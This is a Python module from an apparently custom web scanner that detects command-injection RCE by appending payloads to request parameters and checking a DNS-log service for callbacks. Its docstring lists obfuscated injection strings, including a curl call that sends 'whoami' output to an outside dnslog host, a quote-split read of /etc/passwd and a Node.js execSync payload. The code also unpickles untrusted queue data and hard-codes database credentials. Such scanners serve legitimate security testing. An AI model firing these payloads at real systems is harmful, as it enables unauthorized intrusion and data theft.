#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2019-02-20 17:02:28
# @Author  : donot (donot@donot.me)
# @Link    : https://blog.donot.me

import pickle
import pika
import sys
import os
import json
import requests
import copy
import time
from concurrent.futures import ThreadPoolExecutor
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.realpath(__file__)))))
from lib.rabbitqueue.consumerBase import ConsumerBase
from utils.globalParam import ScanLogger,  BlackParamName, ScanTaskStatus, VulnType, AlertTemplateDict, CWebScanSetting
from utils.DataStructure import RequestData
from utils.payloads import RCEPayload_DNSLOG, RCEPayload_WEBLOG, RCEPayload_RESP
from utils.commonFunc import randomStr, randomInt
from lib.scanscript.scanBase import ScanBase

class RceScan(ScanBase):
    """docstring for RceScan"""
    def __init__(self, request, dbsession):
        super(RceScan, self).__init__(request, dbsession)

    def run(self):
        self.init()

        if self.method == 'GET':
            for key, value in self.getData.items():
                if key not in BlackParamName:
                    hasErrorSqliVuln = self.responsebased('params', key)
                    if hasErrorSqliVuln:
                        self.saveScanResult(VulnType['rce'], key)
                        break
                    else:
                        hasTimeSqliVuln = self.dnslogbased('params', key)
                        if hasTimeSqliVuln:
                            self.saveScanResult(VulnType['rce-dnslog']. key)
                            break
                        else:
                            continue
                else:
                    continue
        elif self.method == 'POST' and self.postData != '':
            for key, value in self.postData.items():
                if key not in BlackParamName:
                    hasErrorSqliVuln = self.responsebased('data', key)
                    if hasErrorSqliVuln:
                        self.saveScanResult(VulnType['rce'], key)
                        break
                    else:
                        hasTimeSqliVuln = self.dnslogbased('data', key)
                        if hasTimeSqliVuln:
                            self.saveScanResult(VulnType['rce-dnslog'], key)
                            break
                        else:
                            continue
                else:
                    continue
        else:
            pass

        self.changeScanStatus(ScanTaskStatus['rce_dnslog_send_finish_check_no'])

    def responsebased(self, loc, key):
        return False

    def dnslogbased(self, loc, key):
        '''
        利用dnslog检测RCE，目前主要是傻瓜怼payload模式
        + | p$IFSing -c 1 {randomStr}.dnslog.com;
        + ; p$IFSing -c 1 {randomStr}.dnslog.com;
        + `p$IFSing -c 1 {randomStr}.dnslog.com`;
        + /b?n/p?ng -c 1 blog.donot.me;
        + /'b'i'n'/'c'a't' /'e't'c'/'p'a's's'w'd;
        + /b\i\n/w\h\i\c\h n\c;
        + pi$9ng -c 1 blog.donot.me;
        + {${phpinfo()}}
        + $(curl http://paopao3.xxxx.dnslog.info/?whoami=`whoami`) - referer
        + _$$ND_FUNC$$_function(){return require('child_process').execSync('whoami',(e,out,err)=>{console.log(out);}); }()
        
        ; command
        | command
        || command
        && commands
        `command`
        $(command)
        无空格 cu$9rl${IFS}baidu.com {curl,baidu.com}
        '''
        payload_randstr =  randomStr(5, seed=int(self.saveid[6:]))
        if loc == 'params' and self.method == 'GET':
            for payload in RCEPayload_DNSLOG:
                _getData = copy.copy(self.getData)
                _getData[key] = _getData[key] + payload.format(Separator='${IFS}',randStr=payload_randstr, DNSLogDomain=CWebScanSetting.dnslog_prefix+'.'+CWebScanSetting.log_suffix)
                res = self.reqSend(loc, _getData, self.url, self.method, self.cookie, self.ua, self.ct, self.SrcRequestHeaders)
        elif loc == 'data' and self.method == 'POST':
            for payload in RCEPayload_DNSLOG:
                _postData = copy.copy(self.postData)
                _postData[key] = _postData[key] + payload.format(Separator='${IFS}', randStr=payload_randstr, DNSLogDomain=CWebScanSetting.dnslog_prefix + '.' + CWebScanSetting.log_suffix)
                print(_postData)
                res = self.reqSend(loc, _postData, self.url, self.method, self.cookie, self.ua, self.ct, self.SrcRequestHeaders)
        elif loc == 'params' and self.method == 'POST':
            return False 
        else:
            return False
        ScanLogger.warning('All Dnslog Payload Send Finish, Payload_Str: %s' % payload_randstr)
        isVuln = self.dnslogCheck(payload_randstr)
        if isVuln:
            # self.saveScanResult(VulnType['rce-dnslog'], key)
            return True
        return False

    def weblogbased(self, loc, key):
        return False

    def dnslogCheck(self, payload_randstr):
        '''
        通过api检查是否有dnslog记录，所有的dnslog请求全部发出后再进行查询，只要查询到即认为有漏洞，未查到暂时标注为无漏洞
        '''
        s = requests.get(CWebScanSetting.dnslog_api.format(searchstr=payload_randstr))
        if s.status_code == 200:
            data = json.loads(s.text)
            if data['status'] == 1:
                cnt = data['total']
                if cnt > 0:
                    return True
                elif cnt <= 0:
                    return False
            else:
                return False
        else:
            return False


class RceScanConsumer(ConsumerBase):
    def __init__(self, amqp_url, queue_name, routing_key, dbsession):
        super(RceScanConsumer, self).__init__(amqp_url, queue_name, routing_key)
        self.scaning = 0
        self.scaned = 0
        self.pool =  ThreadPoolExecutor(30)
        self.dbsession = dbsession

    def on_message(self, unused_channel, basic_deliver, properties, body):
        '''
        重写消息处理方法
        '''
        data = pickle.loads(body)
        ScanLogger.warning('RceScanConsumer Received message # %s from %s: %s',
                    basic_deliver.delivery_tag, properties.app_id, data.netloc)
        self.acknowledge_message(basic_deliver.delivery_tag)
        rcescanObj = RceScan(data, self.dbsession)
        rcescanObjfeaeture = self.pool.submit(rcescanObj.run)
        self.scaning = self.scaning + 1
        ScanLogger.warning("RceScanConsumer commit scantask, taskid: %s, now total scaning task: %s" % (data.scanid, self.scaning))
        rcescanObjfeaeture.add_done_callback(self.threadcallback)
        while self.scaning > 35:
            ScanLogger.warning("RceScanConsumer ThreadPool more than 30, now: {scaningnum}".format(scaningnum=self.scaning))
            time.sleep(3)

    def threadcallback(self, obj):
        print(obj.result())
        ScanLogger.warning("RceScanConsumer task callback, now total scaning task: %s, scaned task: %s" % (self.scaning, self.scaned))
        self.scaning = self.scaning - 1
        self.scaned = self.scaned + 1



def RceScanMain():
    engine = create_engine('mysql+pymysql://root:123456@127.0.0.1:3306/test',pool_size=20)
    DB_Session = sessionmaker(bind=engine)
    rce = RceScanConsumer('amqp://guest:guest@localhost:5672/%2F', 'rcescan', 'rcescan.key', DB_Session)
    try:
        rce.run()
    except KeyboardInterrupt:
        rce.stop()